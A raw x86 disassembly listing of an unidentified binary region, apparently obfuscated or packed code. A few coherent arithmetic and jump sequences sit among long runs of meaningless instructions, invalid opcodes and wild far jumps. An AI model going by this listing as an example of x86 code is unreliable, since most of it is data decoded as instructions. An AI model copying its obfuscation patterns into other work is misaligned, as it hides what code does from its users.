  40c8de:	fwait
  40c8df:	jns    0x40c951
  40c8e1:	scas   al,BYTE PTR es:[edi]
  40c8e2:	mov    al,0xda
  40c8e4:	lahf   
  40c8e5:	aad    0x53
  40c8e7:	jae    0x40c94e
  40c8e9:	fbld   TBYTE PTR [edi]
  40c8eb:	sbb    eax,0xe87d8b4e
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	jp     0x40c96c
  40c91a:	pushf  
  40c91b:	loope  0x40c909
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c97d
  40c925:	xchg   ecx,eax
  40c926:	lock xor ebx,edi
  40c929:	or     ebp,DWORD PTR [eax]
  40c92b:	xchg   ebx,eax
  40c92c:	sub    al,0xa5
  40c92e:	push   ebp
  40c92f:	xchg   ecx,eax
  40c930:	inc    eax
  40c931:	scas   al,BYTE PTR es:[edi]
  40c932:	les    esp,FWORD PTR [ebx+eax*2-0x80]
  40c936:	mov    eax,0xb1fdbe8f
  40c93b:	mov    al,ds:0x4ba7c321
  40c940:	lock add DWORD PTR ds:0x4ab8aca5,ebx
  40c947:	xor    al,0x5d
  40c949:	mov    cl,0x63
  40c94b:	adc    eax,0x1821fa2f
  40c950:	imul   esi,DWORD PTR [ebx+0x5357b24b],0xbc41c49d
  40c95a:	sbb    ebx,esi
  40c95c:	dec    esi
  40c95d:	dec    esp
  40c95e:	dec    ebp
  40c95f:	es mov edi,eax
  40c962:	xchg   DWORD PTR [ebx],edx
  40c964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c965:	jg     0x40c9cb
  40c967:	sub    BYTE PTR [edi-0x63578583],dh
  40c96d:	push   ss
  40c96e:	fdiv   DWORD PTR [edi+0x4f8a695f]
  40c974:	shl    BYTE PTR [esi+0x710f9f24],0x8d
  40c97b:	leave  
  40c97c:	jg     0x40c921
  40c97e:	loop   0x40c954
  40c980:	(bad)  
  40c981:	es inc eax
  40c983:	push   edx
  40c984:	ja     0x40c9fe
  40c986:	sub    al,0x70
  40c988:	push   es
  40c989:	pop    es
  40c98a:	jle    0x40c947
  40c98c:	seta   BYTE PTR [eax]
  40c98f:	mov    esi,edi
  40c991:	fidiv  WORD PTR [edi]
  40c993:	loope  0x40c959
  40c995:	fild   DWORD PTR [ebp+ecx*1-0xbc94d31]
  40c99c:	add    ah,BYTE PTR ds:0x5054b970
  40c9a2:	bound  edi,QWORD PTR [edx+eiz*8]
  40c9a5:	mov    al,0xe7
  40c9a7:	inc    ebp
  40c9a8:	jno    0x40c94f
  40c9aa:	sbb    al,BYTE PTR [edx-0x6b]
  40c9ad:	ror    BYTE PTR [ecx+0x4b],cl
  40c9b0:	cld    
  40c9b1:	shl    BYTE PTR [ebp+edx*8+0x9],1
  40c9b5:	pop    ds
  40c9b6:	sti    
  40c9b7:	xor    eax,0x85f977e6
  40c9bc:	ret    
  40c9bd:	mov    cl,0xdc
  40c9bf:	sub    eax,DWORD PTR [ebp+0x9]
  40c9c2:	xchg   DWORD PTR [ecx+0x2c029b93],eax
  40c9c8:	sub    al,0x6
  40c9ca:	jge    0x40ca3b
  40c9cc:	push   cs
  40c9cd:	mov    eax,ds:0x7a1b38a6
  40c9d2:	add    al,0x20
  40c9d4:	nop
  40c9d5:	in     al,0x46
  40c9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d8:	jne    0x40c9c3
  40c9da:	mov    cl,0xbf
  40c9dc:	pop    edx
  40c9dd:	test   DWORD PTR [edi+0x2e],ebx
  40c9e0:	xlat   BYTE PTR ds:[ebx]
  40c9e1:	mov    BYTE PTR [ebx+0x7f73afec],bl
  40c9e7:	pop    ds
  40c9e8:	mov    dh,0x5d
  40c9ea:	ja     0x40c97f
  40c9ec:	pop    edx
  40c9ed:	sub    al,0x5c
  40c9ef:	fcmovb st,st(6)
  40c9f1:	test   BYTE PTR [ecx+0x138bd7c4],0x8d
  40c9f8:	push   ebp
  40c9f9:	adc    eax,0x62bfade1
  40c9fe:	mov    ebx,0xd0926bcb
  40ca03:	aas    
  40ca04:	stos   BYTE PTR es:[edi],al
  40ca05:	sbb    eax,0x322ef793
  40ca0a:	pop    esp
  40ca0b:	ins    BYTE PTR es:[edi],dx
  40ca0c:	jmp    0xa856471b
  40ca11:	sbb    eax,0x37caab43
  40ca16:	pop    esp
  40ca17:	aas    
  40ca18:	jne    0x40ca65
  40ca1a:	jae    0x40ca32
  40ca1c:	retf   0xdde6
  40ca1f:	repnz xor cl,dl
  40ca22:	jmp    0x40caa2
  40ca24:	cli    
  40ca25:	sub    eax,0x73aa4abd
  40ca2a:	sub    eax,0x1f2b71c2
  40ca2f:	and    bl,BYTE PTR [edi]
  40ca31:	push   ebx
  40ca32:	mov    esi,0x8c2877b6
  40ca37:	dec    esp
  40ca38:	pop    es
  40ca39:	pop    ebx
  40ca3a:	push   cs
  40ca3b:	xchg   ebp,eax
  40ca3c:	bound  ebp,QWORD PTR [ebp-0x56fe8cb8]
  40ca42:	stos   BYTE PTR es:[edi],al
  40ca43:	xchg   ecx,eax
  40ca44:	test   al,0xdf
  40ca46:	pop    ecx
  40ca47:	sbb    al,0xbe
  40ca49:	mov    ch,0xf6
  40ca4b:	add    eax,0x1833c4a1
  40ca50:	mov    fs,WORD PTR [esp+eiz*8]
  40ca53:	dec    eax
  40ca54:	pop    eax
  40ca55:	mov    WORD PTR [esp+eax*4+0x466747cc],ds
  40ca5c:	data16 (bad) 
  40ca5e:	aam    0xdc
  40ca60:	jo     0x40ca99
  40ca62:	cmp    bl,BYTE PTR [ecx+0x70]
  40ca65:	(bad)  
  40ca66:	mov    bh,0x38
  40ca68:	xchg   ebx,eax
  40ca69:	add    BYTE PTR [ebx+eiz*4],0x80
  40ca6d:	jp     0x40ca39
  40ca6f:	pop    ebp
  40ca70:	add    esi,edx
  40ca72:	dec    ebp
  40ca73:	out    dx,eax
  40ca74:	pop    ss
  40ca75:	mov    dh,0xca
  40ca77:	mov    ebp,0x77604e63
  40ca7c:	test   al,0x52
  40ca7e:	push   esp
  40ca7f:	arpl   WORD PTR [edx+0x199c6d36],bx
  40ca85:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca87:	ret    0xee5b
  40ca8a:	xor    ecx,DWORD PTR [ebx+0x2f4a7a09]
  40ca90:	or     DWORD PTR [esi],ebp
  40ca92:	or     al,0x29
  40ca94:	mov    ebx,ebx
  40ca96:	push   0xfffffff0
  40ca98:	mov    edi,0x53789e47
  40ca9d:	hlt    
  40ca9e:	into   
  40ca9f:	retf   
  40caa0:	cmp    al,0x3b
  40caa2:	jns    0x40ca29
  40caa4:	lahf   
  40caa5:	adc    DWORD PTR [ecx-0x6f],esi
  40caa8:	add    ebp,esi
  40caaa:	sbb    BYTE PTR [ebp+0x66],dl
  40caad:	jle    0x40ca73
  40caaf:	fist   DWORD PTR [ebp-0x76]
  40cab2:	sbb    al,0x17
  40cab4:	mov    ecx,ecx
  40cab6:	jae    0x40cb1f
  40cab8:	or     BYTE PTR [ebx+0x27],bl
  40cabb:	push   0x61
  40cabd:	dec    ecx
  40cabe:	sbb    al,BYTE PTR [ebx]
  40cac0:	fsub   QWORD PTR [ecx-0x4ad10bd1]
  40cac6:	xor    eax,0x6d3b45b9
  40cacb:	in     eax,dx
  40cacc:	cmp    al,0xa6
  40cace:	clc    
  40cacf:	retf   0x311c
  40cad2:	jp     0x40cb2b
  40cad4:	pop    esp
  40cad5:	fs or  al,0x4a
  40cad8:	sbb    esp,DWORD PTR [edi-0x56]
  40cadb:	aam    0x40
  40cadd:	cmc    
  40cade:	push   ebx
  40cadf:	rol    dl,0x58
  40cae2:	sub    al,0xd7
  40cae4:	pop    ds
  40cae5:	nop
  40cae6:	fisub  DWORD PTR [edi]
  40cae8:	and    al,0xf4
  40caea:	or     ebx,DWORD PTR [edx-0x1a]
  40caed:	push   es
  40caee:	jmp    0xeae75276
  40caf3:	(bad)  
  40caf4:	pop    edi
  40caf5:	xor    BYTE PTR [eax+0x7f],dl
  40caf8:	jg     0x40cacf
  40cafa:	sub    DWORD PTR [ebx+0x44],0x9602be0d
  40cb01:	mov    ebp,0x2f916de0
  40cb06:	daa    
  40cb07:	push   0xeeeea1d7
  40cb0c:	retf   
  40cb0d:	jle    0x40cb3b
  40cb0f:	inc    ecx
  40cb10:	push   eax
  40cb11:	pop    ss
  40cb12:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40cb14:	or     eax,0xbf718ae4
  40cb19:	(bad)  
  40cb1a:	retf   
  40cb1b:	ins    BYTE PTR es:[edi],dx
  40cb1c:	or     eax,0x4f8e8749
  40cb21:	sub    edi,DWORD PTR [edx+ecx*1-0x358379ec]
  40cb28:	pop    eax
  40cb29:	and    al,0xb5
  40cb2b:	in     eax,dx
  40cb2c:	or     ecx,DWORD PTR [edx]
  40cb2e:	aam    0xd3
  40cb30:	std    
  40cb31:	pusha  
  40cb32:	imul   ch
  40cb34:	bound  eax,QWORD PTR ss:[ecx]
  40cb37:	stc    
  40cb38:	in     eax,0xf6
  40cb3a:	and    DWORD PTR [ebx-0x2982f2f8],ebx
  40cb40:	mov    bh,0xac
  40cb42:	inc    ebp
  40cb43:	push   ebp
  40cb44:	int3   
  40cb45:	in     al,0x57
  40cb47:	loop   0x40cb40
  40cb49:	lods   al,BYTE PTR ds:[esi]
  40cb4a:	pmuludq mm3,QWORD PTR [ecx]
  40cb4d:	dec    edx
  40cb4e:	dec    ebp
  40cb4f:	jl     0x40cb43
  40cb51:	arpl   bp,cx
  40cb53:	pop    edi
  40cb54:	pop    ss
  40cb55:	enter  0x61ed,0xd7
  40cb59:	jbe    0x40caf8
  40cb5b:	push   ss
  40cb5c:	popa   
  40cb5d:	add    al,0x42
  40cb5f:	(bad)  
  40cb60:	adc    al,BYTE PTR [ebp+0x5d]
  40cb63:	cmp    al,0xd4
  40cb65:	data16 aam 0x1
  40cb68:	dec    eax
  40cb69:	pushaw 
  40cb6b:	push   esi
  40cb6c:	pop    edi
  40cb6d:	jmp    0x40cb08
  40cb6f:	push   ss
  40cb70:	fcomp  DWORD PTR [ebx]
  40cb72:	in     al,dx
  40cb73:	(bad)  
  40cb74:	or     DWORD PTR [eax],esp
  40cb76:	(bad)  [edi+eax*4-0x14f435b3]
  40cb7d:	xor    al,0xb3
  40cb7f:	add    dh,BYTE PTR [ecx*8-0x2d450e8d]
  40cb86:	sahf   
  40cb87:	pop    ebp
  40cb88:	iret   
  40cb89:	retf   0xbf6c
  40cb8c:	push   ebp
  40cb8d:	enter  0xa1fe,0x89
  40cb91:	fs and al,0xcb
  40cb94:	add    al,0x9
  40cb96:	cmp    eax,0x4611b98e
  40cb9b:	jb     0x40cb88
  40cb9d:	sbb    BYTE PTR [edi],dh
  40cb9f:	adc    ah,bh
  40cba1:	add    cl,BYTE PTR [ebp+0x4196c08e]
  40cba7:	and    BYTE PTR [eax],bh
  40cba9:	mov    ds:0x79a85d47,eax
  40cbae:	add    al,0x58
  40cbb0:	mov    al,0x7a
  40cbb2:	mov    ah,0xe
  40cbb4:	popa   
  40cbb5:	aam    0xee
  40cbb7:	pop    edx
  40cbb8:	jno    0x40cc18
  40cbba:	mov    al,0xa0
  40cbbc:	aam    0x19
  40cbbe:	outs   dx,DWORD PTR ds:[esi]
  40cbbf:	pop    ecx
  40cbc0:	stc    
  40cbc1:	stos   BYTE PTR es:[edi],al
  40cbc2:	sub    bh,BYTE PTR [esi-0x7060dd25]
  40cbc8:	ins    DWORD PTR es:[edi],dx
  40cbc9:	dec    ebx
  40cbca:	cwde   
  40cbcb:	jge    0x40cc3e
  40cbcd:	adc    BYTE PTR [eax],bl
  40cbcf:	and    BYTE PTR [ebx+eiz*8+0x6ddc361b],0x83
  40cbd7:	push   esi
  40cbd8:	daa    
  40cbd9:	sbb    bl,bh
  40cbdb:	inc    ebp
  40cbdc:	pushf  
  40cbdd:	mov    dh,0x38
  40cbdf:	(bad)  
  40cbe0:	and    al,0xbc
  40cbe2:	inc    edi
  40cbe3:	sbb    cl,al
  40cbe5:	outs   dx,DWORD PTR ds:[esi]
  40cbe6:	xlat   BYTE PTR cs:[ebx]
  40cbe8:	in     eax,0x87
  40cbea:	aam    0xee
  40cbec:	test   edi,edi
  40cbee:	ds sbb al,0x13
  40cbf1:	jno    0x40cbcf
  40cbf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbf4:	adc    BYTE PTR [esi],dh
  40cbf6:	imul   BYTE PTR cs:[eax]
  40cbf9:	push   esi
  40cbfa:	das    
  40cbfb:	jge    0x40cc1e
  40cbfd:	jg     0x40cc21
  40cbff:	inc    edx
  40cc00:	dec    edx
  40cc01:	loope  0x40cbea
  40cc03:	test   BYTE PTR [eax+ecx*8],bl
  40cc06:	mov    al,ds:0x36077a47
  40cc0b:	daa    
  40cc0c:	fwait
  40cc0d:	pop    edx
  40cc0e:	and    BYTE PTR [esi+0x11],dl
  40cc11:	lods   al,BYTE PTR ds:[esi]
  40cc12:	repnz fwait
  40cc14:	jbe    0x40cc3b
  40cc16:	int    0xe6
  40cc18:	mov    bh,0xc2
  40cc1a:	dec    ebx
  40cc1b:	or     BYTE PTR ds:0x8963b099,ah
  40cc21:	leave  
  40cc22:	add    DWORD PTR [eax],ebx
  40cc24:	aad    0x1c
  40cc26:	push   ss
  40cc27:	inc    edi
  40cc28:	mov    ebp,0x4e855f04
  40cc2d:	mov    cl,0xfc
  40cc2f:	outs   dx,DWORD PTR ds:[esi]
  40cc30:	cmp    edx,DWORD PTR [ecx]
  40cc32:	lea    edx,[edi+edi*2-0x2d46054]
  40cc39:	sbb    edx,DWORD PTR [ebx-0x4b]
  40cc3c:	(bad)  [eax]
  40cc3e:	inc    eax
  40cc3f:	outs   dx,BYTE PTR ds:[esi]
  40cc40:	push   eax
  40cc41:	mov    bl,0x5c
  40cc43:	out    0x22,al
  40cc45:	test   BYTE PTR [ecx],dh
  40cc47:	add    dh,BYTE PTR [ebx+0x5c5c20ce]
  40cc4d:	inc    eax
  40cc4e:	sahf   
  40cc4f:	repz das 
  40cc51:	loopne 0x40cc6f
  40cc53:	retf   0x34f9
  40cc56:	in     eax,0x26
  40cc58:	stos   BYTE PTR es:[edi],al
  40cc59:	dec    esi
  40cc5a:	fs into 
  40cc5c:	jge    0x40cc3e
  40cc5e:	aam    0xae
  40cc60:	std    
  40cc61:	push   edx
  40cc62:	fadd   st,st(0)
  40cc64:	hlt    
  40cc65:	ds inc eax
  40cc67:	jae    0x40cc23
  40cc69:	inc    ebx
  40cc6a:	fisub  WORD PTR [ecx+0x61ec44]
  40cc70:	repz sub edx,DWORD PTR [ebp+0x27]
  40cc74:	mov    eax,0xf9e7ba76
  40cc79:	jp     0x40cc40
  40cc7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc7c:	sub    DWORD PTR [ebp+0x615d1000],0xac85845c
  40cc86:	xchg   ebp,eax
  40cc87:	retf   
  40cc88:	jno    0x40cd00
  40cc8a:	and    eax,0x25fe30b6
  40cc8f:	cmp    DWORD PTR [ebx-0x67ba89ca],edi
  40cc95:	popa   
  40cc96:	push   eax
  40cc97:	cmp    ebp,0x54586853
  40cc9d:	popfw  
  40cc9f:	sub    ebx,DWORD PTR [ecx-0x46]
  40cca2:	cdq    
  40cca3:	xchg   ebp,eax
  40cca4:	stos   BYTE PTR es:[edi],al
  40cca5:	shrd   eax,eax,cl
  40cca8:	adc    dh,ah
  40ccaa:	jo     0x40cd16
  40ccac:	dec    edx
  40ccad:	mov    ebx,0x6d6836fa
  40ccb2:	xor    eax,0x19b4fa20
  40ccb7:	scas   al,BYTE PTR es:[edi]
  40ccb8:	aaa    
  40ccb9:	sbb    al,BYTE PTR gs:[edx+0x5800ff29]
  40ccc0:	add    edx,ebp
  40ccc2:	test   al,0x8b
  40ccc4:	(bad)  
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	add    DWORD PTR [ebp-0x65],0x39
  40cd19:	pop    esi
  40cd1a:	or     edx,DWORD PTR [eax+0x7d9f7070]
  40cd20:	jo     0x40cd92
  40cd22:	push   ecx
  40cd23:	(bad)  
  40cd24:	stc    
  40cd25:	mov    ch,0xd9
  40cd27:	jne    0x40ccd4
  40cd29:	cli    
  40cd2a:	mov    cl,0x57
  40cd2c:	sahf   
  40cd2d:	push   ds
  40cd2e:	bnd ret 0xe167
  40cd32:	jo     0x40cd85
  40cd34:	jmp    0xf649c436
  40cd39:	lock dec edx
  40cd3b:	pop    edi
  40cd3c:	cld    
  40cd3d:	outs   dx,DWORD PTR ds:[esi]
  40cd3e:	mov    edx,0x12688b79
  40cd44:	fmul   st(1),st
  40cd46:	sub    eax,0xbec57976
  40cd4b:	sub    al,0x45
  40cd4d:	jno    0x40cd72
  40cd4f:	pop    ebx
  40cd50:	add    al,0x61
  40cd52:	mov    esi,DWORD PTR [eax+0x1c49fb18]
  40cd58:	lods   al,BYTE PTR ds:[esi]
  40cd59:	xchg   edi,eax
  40cd5a:	mov    eax,DWORD PTR [edi-0xf1a1803]
  40cd60:	push   ebp
  40cd61:	xchg   ecx,eax
  40cd62:	fstp   DWORD PTR [ecx]
  40cd64:	dec    edi
  40cd65:	ret    
  40cd66:	mov    ebx,0xb5a49064
  40cd6b:	mov    edi,0x42da7098
  40cd70:	pop    esi
  40cd71:	lahf   
  40cd72:	neg    BYTE PTR [ebp*1-0x647e1d30]
  40cd79:	idiv   bl
  40cd7b:	dec    esp
  40cd7c:	add    DWORD PTR [edi+eax*2-0x303a3ae4],0x58
  40cd84:	iret   
  40cd85:	inc    ebp
  40cd86:	dec    ecx
  40cd87:	std    
  40cd88:	jmp    0x40cdad
  40cd8a:	(bad)  
  40cd8c:	cmp    BYTE PTR [edx-0xd81398a],bl
  40cd92:	jnp    0x40cd3c
  40cd94:	cli    
  40cd95:	mov    ah,0x96
  40cd97:	sub    eax,DWORD PTR gs:[ebx+0x3a960eda]
  40cd9e:	mov    cl,0x20
  40cda0:	push   ds
  40cda1:	fnstenv [esi-0x23]
  40cda4:	pusha  
  40cda5:	or     eax,0x323af0ac
  40cdaa:	jno    0x40ce10
  40cdac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdad:	leave  
  40cdae:	add    al,0xe3
  40cdb0:	fisttp QWORD PTR [eax+0x6a]
  40cdb3:	cli    
  40cdb4:	push   ecx
  40cdb5:	lahf   
  40cdb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdb7:	ror    ecx,cl
  40cdb9:	pop    ds
  40cdba:	das    
  40cdbb:	mul    DWORD PTR [edx]
  40cdbd:	and    eax,0x725c4854
  40cdc2:	loop   0x40cdf4
  40cdc4:	pop    esi
  40cdc5:	fisttp QWORD PTR [esi+0x70]
  40cdc8:	jmp    0xfe858e16
  40cdcd:	pushf  
  40cdce:	fcmovb st,st(7)
  40cdd0:	cs loop 0x40cdec
  40cdd3:	outs   dx,BYTE PTR ds:[esi]
  40cdd4:	fsub   st(2),st
  40cdd6:	jp     0x40cd84
  40cdd8:	(bad)  
  40cdd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdda:	xor    ebp,DWORD PTR [eax+0x15]
  40cddd:	int3   
  40cdde:	adc    eax,0x9daa1733
  40cde3:	push   ebx
  40cde4:	push   esp
  40cde5:	imul   ebp,DWORD PTR [eax+ebx*4],0xfffffff6
  40cde9:	xchg   DWORD PTR [edi],eax
  40cdeb:	jbe    0x40cd85
  40cded:	adc    eax,0x1c3640f
  40cdf2:	mov    ch,0x61
  40cdf4:	pusha  
  40cdf5:	dec    ecx
  40cdf6:	dec    edi
  40cdf7:	jge    0x40ce5f
  40cdf9:	sbb    al,BYTE PTR [edx]
  40cdfb:	(bad)  
  40cdfc:	sbb    edx,DWORD PTR [ebx+edx*1+0x7a]
  40ce00:	mov    esp,0xdcfa837e
  40ce05:	sbb    al,0x16
  40ce07:	inc    edx
  40ce08:	sub    ebx,DWORD PTR [ebx+edx*4]
  40ce0b:	ins    DWORD PTR es:[edi],dx
  40ce0c:	loop   0x40cdf1
  40ce0e:	or     eax,0xd789d4ed
  40ce13:	add    al,0x46
  40ce15:	xchg   edx,eax
  40ce16:	cs std 
  40ce18:	mov    eax,ds:0xecd190e5
  40ce1d:	scas   al,BYTE PTR es:[edi]
  40ce1e:	adc    BYTE PTR [ebx],al
  40ce20:	bound  esp,QWORD PTR [ebp-0x2d]
  40ce23:	and    esi,DWORD PTR ds:0xeeed4d6a
  40ce29:	call   0x9e0ea9d5
  40ce2e:	jo     0x40cde8
  40ce30:	in     eax,dx
  40ce31:	pop    esi
  40ce32:	lds    eax,FWORD PTR [ebx]
  40ce34:	adc    DWORD PTR [ecx-0x6c14e12],ecx
  40ce3a:	mov    bl,0xb3
  40ce3c:	loope  0x40ce77
  40ce3e:	jb     0x40ce5c
  40ce40:	aad    0x63
  40ce42:	xchg   bh,dh
  40ce44:	xchg   BYTE PTR [edx+0x6d680081],ch
  40ce4a:	call   0xd420:0x8ffe1f75
  40ce51:	(bad)  
  40ce52:	and    al,0xde
  40ce54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce55:	out    dx,eax
  40ce56:	retf   0x4a4a
  40ce59:	jbe    0x40ce50
  40ce5b:	jmp    0x500c7190
  40ce60:	outs   dx,BYTE PTR ds:[esi]
  40ce61:	push   cs
  40ce62:	cmp    edi,0x9401878a
  40ce68:	xor    DWORD PTR [eax-0x4179c90f],0xffffffe4
  40ce6f:	adc    al,0xf3
  40ce71:	xchg   esp,eax
  40ce72:	or     al,0x41
  40ce74:	test   DWORD PTR [ebp+0xeda792a],ebx
  40ce7a:	xchg   edi,eax
  40ce7b:	outs   dx,BYTE PTR ds:[esi]
  40ce7c:	out    0xdd,al
  40ce7e:	jmp    0xb327:0xafac4258
  40ce85:	pop    ebp
  40ce86:	xchg   esi,eax
  40ce87:	test   eax,0x702f0991
  40ce8c:	(bad)  
  40ce8d:	push   ebp
  40ce8e:	out    0x59,al
  40ce90:	push   esi
  40ce91:	inc    ebx
  40ce92:	jno    0x40cecd
  40ce94:	pop    esi
  40ce95:	xchg   edi,edi
  40ce97:	rcl    DWORD PTR [ebx-0x654ee9f3],0x12
  40ce9e:	inc    ebx
  40ce9f:	mov    ebx,0xf0d05e1a
  40cea4:	lahf   
  40cea5:	xchg   esp,eax
  40cea6:	scas   eax,DWORD PTR es:[edi]
  40cea7:	add    al,0xd9
  40cea9:	fs fadd st(1),st
  40ceac:	pusha  
  40cead:	xor    ah,BYTE PTR [edi-0x2c7c27ea]
  40ceb3:	or     eax,0xfb167e37
  40ceb8:	pop    esi
  40ceb9:	enter  0xd0d0,0x6d
  40cebd:	xlat   BYTE PTR ds:[ebx]
  40cebe:	jecxz  0x40cebe
  40cec0:	es xchg ecx,eax
  40cec2:	jge    0x40ceab
  40cec4:	imul   ebx
  40cec6:	inc    ebx
  40cec7:	fidiv  DWORD PTR [ecx-0x47]
  40ceca:	pop    ecx
  40cecb:	and    DWORD PTR [esi],edi
  40cecd:	(bad)  
  40cece:	in     al,dx
  40cecf:	shrd   DWORD PTR [edi],esi,0xe0
  40ced3:	fldenv [edx+esi*8-0x41]
  40ced7:	jecxz  0x40cee4
  40ced9:	pop    esi
  40ceda:	clc    
  40cedb:	mov    esp,0xbaa18e5
  40cee0:	sti    
  40cee1:	and    ebp,DWORD PTR [ebx]
  40cee3:	dec    edi
  40cee4:	pop    ds
  40cee5:	scas   al,BYTE PTR es:[edi]
  40cee6:	push   esi
  40cee7:	out    0xc9,eax
  40cee9:	pop    ebp
  40ceea:	cmp    dh,BYTE PTR [eax-0x66]
  40ceed:	mov    ah,0xdf
  40ceef:	cmp    dl,BYTE PTR [edi]
  40cef1:	test   BYTE PTR fs:[ebx-0x1a893f45],ah
  40cef8:	dec    edx
  40cef9:	call   0x60cc:0xa1964b14
  40cf00:	repnz xchg edx,eax
  40cf02:	stos   DWORD PTR es:[edi],eax
  40cf03:	xor    edx,DWORD PTR [edx]
  40cf05:	inc    esi
  40cf06:	(bad)  [eax+0x1c]
  40cf09:	mov    cl,BYTE PTR [ebx+edi*2]
  40cf0c:	jo     0x40cecc
  40cf0e:	jbe    0x40cf2b
  40cf10:	iret   
  40cf11:	fst    st(4)
  40cf13:	mov    edx,0xfd1db049
  40cf18:	(bad)
  40cf1d:	into   
  40cf1e:	nop
  40cf1f:	adc    al,0x10
  40cf21:	ss inc esp
  40cf23:	mov    edi,0x5bbe2008
  40cf28:	pusha  
  40cf29:	retf   
  40cf2a:	xor    BYTE PTR [esi-0x2804e40e],cl
  40cf30:	jl     0x40ceb3
  40cf32:	outs   dx,BYTE PTR ds:[esi]
  40cf33:	(bad)  
  40cf35:	and    eax,0x41a90284
  40cf3a:	adc    dl,bh
  40cf3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf3d:	ret    0xfabc
  40cf40:	loope  0x40cf3d
  40cf42:	sbb    DWORD PTR [edx+0x6b],ebp
  40cf45:	fs cdq 
  40cf47:	or     DWORD PTR [edi+esi*8-0x64],esp
  40cf4b:	scas   al,BYTE PTR es:[edi]
  40cf4c:	push   ecx
  40cf4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf4e:	jnp    0x40cef5
  40cf50:	mov    edi,0xe1d91412
  40cf55:	adc    dl,al
  40cf57:	cmp    DWORD PTR [ecx],edx
  40cf59:	test   BYTE PTR [eax],ch
  40cf5b:	jge    0x40cf41
  40cf5d:	push   esp
  40cf5e:	sbb    eax,0xf41d77fc
  40cf63:	push   edi
  40cf64:	ins    DWORD PTR es:[edi],dx
  40cf65:	push   esp
  40cf66:	sti    
  40cf67:	inc    ecx
  40cf68:	call   DWORD PTR [ebp-0x2e]
  40cf6b:	pop    ebx
  40cf6c:	lods   eax,DWORD PTR ds:[esi]
  40cf6d:	loope  0x40cfb2
  40cf6f:	pop    dx
  40cf71:	xor    DWORD PTR [edx],eax
  40cf73:	and    al,0xc5
  40cf75:	test   al,0x94
  40cf77:	xchg   esi,eax
  40cf78:	push   edi
  40cf79:	ror    DWORD PTR [ecx],1
  40cf7b:	mov    ds:0x404af69b,eax
  40cf80:	adc    eax,0x509f5084
  40cf85:	scas   al,BYTE PTR es:[edi]
  40cf86:	xor    DWORD PTR [ecx],esp
  40cf88:	cmp    bh,BYTE PTR [edx+edi*4+0x25a8406a]
  40cf8f:	lods   eax,DWORD PTR ds:[esi]
  40cf90:	pushf  
  40cf91:	in     eax,dx
  40cf92:	mov    dh,0xde
  40cf94:	rcr    BYTE PTR [ebp-0x33],0x3a
  40cf98:	dec    ecx
  40cf99:	cmp    ebp,ecx
  40cf9b:	outs   dx,DWORD PTR ds:[esi]
  40cf9c:	mov    eax,0x512d3c66
  40cfa1:	fdivr  QWORD PTR [eax]
  40cfa3:	sub    al,0x1
  40cfa5:	add    al,0x5f
  40cfa7:	push   ecx
  40cfa8:	sub    dl,bl
  40cfaa:	fld    QWORD PTR [ebx+0x1c5aee4a]
  40cfb0:	xor    al,cl
  40cfb2:	pop    ecx
  40cfb3:	inc    ebx
  40cfb4:	push   ebx
  40cfb5:	(bad)  
  40cfb6:	cmp    ebx,DWORD PTR [ebp-0x2a]
  40cfb9:	push   ds
  40cfba:	jns    0x40cf67
  40cfbc:	in     al,0xba
  40cfbe:	ins    DWORD PTR es:[edi],dx
  40cfbf:	mov    ah,0xb2
  40cfc1:	or     eax,0xe6b654ff
  40cfc6:	xchg   edi,eax
  40cfc7:	and    BYTE PTR [ecx+edx*2],al
  40cfca:	aaa    
  40cfcb:	lahf   
  40cfcc:	adc    DWORD PTR [edi+0x4a],eax
  40cfcf:	inc    ecx
  40cfd0:	adc    dl,BYTE PTR [ebp-0x4f]
  40cfd3:	adc    ebx,ebx
  40cfd5:	mov    esp,0xd649abd4
  40cfda:	jmp    0x40cfe4
